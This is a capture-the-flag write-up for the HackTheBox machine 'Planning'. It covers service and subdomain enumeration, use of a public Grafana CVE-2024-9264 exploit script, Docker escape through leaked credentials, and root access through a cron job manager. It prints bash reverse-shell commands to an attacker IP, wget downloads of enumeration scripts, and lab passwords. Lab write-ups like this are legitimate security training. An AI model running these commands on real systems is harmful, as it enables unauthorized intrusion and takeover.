---
description: Here are the write-ups for HTB machine, Planning.
icon: linux
---

# Planning

<img src=".gitbook/assets/image (31).png" alt="" data-size="original">

## **Scanning & Enumeration**

### Services Discovery & Open Port

At first, we are only given an IP Address of the target machine and unknown credential `admin:0D5oT70Fq13EvB5r`.With this information, we can find out what services are running and which ports are open and we can try any login form with given credential.

```
nmap -sC -sV 10.10.11.68
```

<figure><img src=".gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

> **-sC** - Help automate discovery and vulnerability scanning using Nmap Script Engine(NSE), which will run all NSE scripts on the target.
>
> **-sV** - Help determine the version of the services running

Based on the output, we discovered 2 ports are open, which are port 22 (SSH) and port 80 (HTTP).

### Service Enumeration

#### **Port 22 (SSH)**

Usually, nothing is useful here. BUT, you should check its version and try to find a vulnerability associated with it.

#### **Port 80 (HTTP)**

Most of the time, a machine with an active port 80 is hosting a website. You should enumerate the website to find useful information or vulnerabilities within it. We should start with associate discovered domain name in nmap output with its IP Address.

```
mousepad /etc/hosts # then append "10.10.11.68	planning.htb"
```

**Structure Enumeration**

When working with website, we should collect as much information as possible, the look for weak point and potential vulnerability within the website. Here's the basic step that it do

**Enumerate website structure using Wapplyzer**

<figure><img src=".gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Nothing useful here, but just as additional information
{% endhint %}

Based on this information, we can look out version of technologies used online for potential vulnerability. but I found nothing useful here.

#### **Directory Fuzzing (Directory Discovery)**

Let's move on with directory fuzzing. There's many tools we can use to fuzz directory, but for this writeup I will use FFUF tool with SecLists's discovery wordlist. This step helps us discover hidden directories that potential disclose critical information such as admin panel, improper config file and other important files.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://planning.htb/FUZZ
```

<figure><img src=".gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

From this output, we can enumerate these directories, but we probably find nothing since there's not suspicious file.

#### Subdomain Fuzzing (Subdomain Discovery)

Let's move on to subdomain fuzzing. We still can use FFUF with SecLists's DNS wordlist. Leveraging FFUF, we could try to discover subdomain of the website, potentially widen our attack surface. We potentially find test env. or abandoned subdomain which might exposed critical information.

```
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://planning.htb -H "Host: FUZZ.planning.htb" -fs 178
```

{% hint style="info" %}
**-w** - argument to include specific wordlist

**-u** - specify target url

**-H** - specify FUZZ location in host header

**-fs** - Filter output by size
{% endhint %}

<figure><img src=".gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

#### Subdomain Enumeration

We got a positive result here, with this information we can enumerate this subdomain to find any useful information that we could leverage.

<figure><img src=".gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

We can try to login using given credential. `admin:0D5oT70Fq13EvB5r`&#x20;

<figure><img src=".gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

We successfully logged-in, I believe this is an admin control panel. To further our move, we can explore this panel to find any critical point like information disclosure and vulnerability associated with panel's version. After a long "click-anywhere-you-can" and researching on panel's version. We discovered that this panel's version is associated with critical severity security vulnerability ([**CVE-2024-9264**](https://grafana.com/blog/2024/10/17/grafana-security-release-critical-severity-fix-for-cve-2024-9264/)).

<figure><img src=".gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

## Gaining Access / Exploitation

Let's find any public exploit method / script for this CVE. We can just google it directly or lookup to any common platform like ExploitDB and Github. After a bit of googling, I found an exploit script on Github \[[CVE-2024-9264](https://github.com/nollium/CVE-2024-9264)]. We can clone it into our attack machine and leverage the script on our target

```
git clone https://github.com/nollium/CVE-2024-9264.git CVE-2024-9264
cd CVE-2024-9264
pip install -r requirements.txt # Enable py virtual env if needed
python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c whoami http://grafana.planning.htb
```

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>

We successfully do **Command Injection** on target machine.

## Maintaining Access

With current script, we have limited shell access. To maintain our access, we should establish stable interactive shell. We can craft payload to establish reverse shell on our machine.

```
python3 CVE-2024-9264.py -u admin -p '0D5oT70Fq13EvB5r' -c '/bin/bash -c "sh -i >& /dev/tcp/10.10.16.103/9003 0>&1"'  http://grafana.planning.htb
```

<figure><img src=".gitbook/assets/image (45).png" alt=""><figcaption></figcaption></figure>

We successfully establish a reverse shell, but it doesn't look really stable. So, I did bit more research on stabilizing shell, I found this article \[[Stabilize Shell Like A Pro](https://medium.com/h7w/how-to-stabilize-a-shell-like-a-pro-without-losing-your-mind-bcb28c4fe79e)].

```
script -qc bash /dev/null
```

<figure><img src=".gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>

The shell looks more stable now, now let's focus on the target machine. It's pretty suspicious that we directly get root privilege on this machine. So i decide to identify if it is a container or actual server by listing all files including hidden files on root path with extensive information using following command.

```
ls / -al
```

<figure><img src=".gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>

## Int. Enumerate & Privilege Escalation

Seems like we're in docker container that running in the server. Now we have to try to escape. We can use **LinEnum.sh** to enumerate for potential privilege escalation to escape this docker. I downloaded LinEnum.sh on my machine, hosted using python http server then download it from my machine to victim machine.

```
python3 -m http.server 8000 # Execute on Attacker machine, make sure you're in directory contains LinEnum.sh
wget http://10.10.16.103:8000/LinEnum.sh # Execute on Target machine
chmod +x LinEnum.sh # Execute on Target machine
./LinEnum.sh # Execute on Target Machine
```

Let's examine our output, find any critical information that help us to privilege escalation.

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

We found admin username and password in Environment Information: `enzo:RioTecRANDEntANT!` . We can try this credential on SSH.

```
ssh enzo@10.10.11.68
```

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

We finally escape from docker and gain access on actual server via SSH by leveraging leaked credential. Let's find user flag first, it usually located at `home/username/flag.txt`.

```
cd /home/enzo
ls
cat user.txt
```

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

We successfully gain access to user-level. Let's start enumeration to privilege escalation to root. We can utilized script like **LinPEAS.sh.** We can download this script from our machine into this machine and execute it using these commands.

```
wget http://10.10.16.103/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption></figcaption></figure>

Here the indicator of PE vector, we should look out this on the output.&#x20;

After A LOT of try and error, like runc and ctr abuse, possible binary file with root suid or sudo. Everything doesn't work out, so instead of working on exploit. I'll try to look up for information disclosure and found this information.

<figure><img src=".gitbook/assets/image (55).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
What is crontab?

Crontab is a command-line utility for the Unix task scheduler.
{% endhint %}

<figure><img src=".gitbook/assets/image (58).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (57).png" alt=""><figcaption></figcaption></figure>

We discover a .db file that potential store critical information and also we confirmed that crontab is run as root. Besides, we also discover that port 8000 (Alternative HTTP) is listening but only within localhost.

### Interesting Files Enumeration (crontab.db)

<figure><img src=".gitbook/assets/image (63).png" alt=""><figcaption></figcaption></figure>

This file isn’t a traditional crontab file (`crontab -l` output). Instead, it looks like a custom JSON-based job scheduler or a database used by some cron job management tool (maybe a custom web app or a third-party tool managing cron jobs). This file content shows entries like grafana backup and cleanup. We also discovered password `P4ssw0rdS0pRi0T3c` that were used to protect file and probably used by other user (maybe `root`).

### Port 8000 Enumeration

Connected to ssh server with port forward on remote localhost(planning.htb) port 8000 from our port 9000. Let's enumerate the website.

```
ssh -L 9000:localhost:8000 enzo@planning.htb
```

<figure><img src=".gitbook/assets/image (59).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (60).png" alt=""><figcaption></figcaption></figure>

We encounter a login page. We can utilized our own wordlist that we make a long this way.

```
admin:0D5oT70Fq13EvB5r
enzo:RioTecRANDEntANT!
root:P4ssw0rdS0pRi0T3c
```

We successfully authenticate as root using discovered password on `crontab.db` There's multiple cronjob entries that matches JSON based .db file we read previously.

<figure><img src=".gitbook/assets/image (64).png" alt=""><figcaption></figcaption></figure>

Leveraging this custom cronjob management tool, We can create and run new entry that establish reverse shell to our machine using this command.&#x20;

<pre><code><strong>/bin/bash -c "sh -i >&#x26; /dev/tcp/10.10.16.103/9003 0>&#x26;1"
</strong></code></pre>

<figure><img src=".gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

Before run this entry, ensure that our listener is properly configured. Then, Here we go, we successfully escalate our privilege to root using this reverse shell. Now, we can claim our root flag in `root.txt` file.

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>
